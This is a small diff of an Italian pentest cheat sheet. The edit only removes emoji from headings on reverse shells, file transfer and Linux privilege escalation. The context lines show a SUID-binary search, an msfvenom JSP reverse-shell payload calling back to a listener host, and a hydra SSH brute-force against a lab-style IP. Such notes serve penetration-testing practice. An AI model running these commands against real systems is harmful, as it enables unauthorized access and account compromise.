@@ -91,7 +91,7 @@ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
 
 ---
 
-## 🐚 Reverse Shell (rapide)
+## Reverse Shell (rapide)
 
 ```bash
 # Bash
@@ -116,7 +116,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.0.41 LPORT=80 -f war -o revsh
 
 ---
 
-## 📤 Trasferimento File
+## Trasferimento File
 
 ```bash
 # Dal target (pull)
@@ -196,7 +196,7 @@ hydra -l tiago -P /usr/share/wordlists/rockyou.txt 192.168.136.48 -t 4 ssh
 ```
 ---
 
-## 🧪 Privilege Escalation Linux
+## Privilege Escalation Linux
 
 ```bash
 # Verifica sudo senza password
